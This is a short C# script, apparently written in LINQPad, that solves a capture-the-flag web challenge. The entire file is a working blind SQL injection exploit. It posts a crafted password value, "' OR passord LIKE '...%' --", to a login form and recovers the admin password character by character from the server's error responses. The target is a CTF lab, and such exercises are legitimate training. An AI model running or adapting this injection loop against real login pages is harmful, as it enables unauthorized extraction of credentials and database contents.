var url = "http://ctf.uiactf.no:3005/index.php?page=login.php";
var handler = new HttpClientHandler() { UseCookies = false };
var c = new HttpClient(handler);

var charsToTry = "{}!abcdefghijklmnopqrstuvwxyzæøå0123456789_";
var charsFound = "";
var charIndex = 0;

while (!charsFound.Any() || charsFound.Last() != '}')
{
    var currentChar = charsToTry[charIndex];
    
    var content = new FormUrlEncodedContent(new[]
    {
        new KeyValuePair<string, string>("epost", "admin@minkulewebapp.finnesikke"),
        new KeyValuePair<string, string>("login", "login"),
        new KeyValuePair<string, string>("passord", $"' OR passord LIKE '{charsFound}{currentChar}%' --"),
    });

    var r = await c.PostAsync(url, content);
    var s = await r.Content.ReadAsStringAsync();
    
    var querySuccess = !s.Contains("Feil brukernavn eller passord");
    
    if (querySuccess) {
        charIndex = 0;
        charsFound = charsFound + currentChar;
        Util.ClearResults();
        charsFound.Dump();
    } else {
        charIndex++;
    }
}
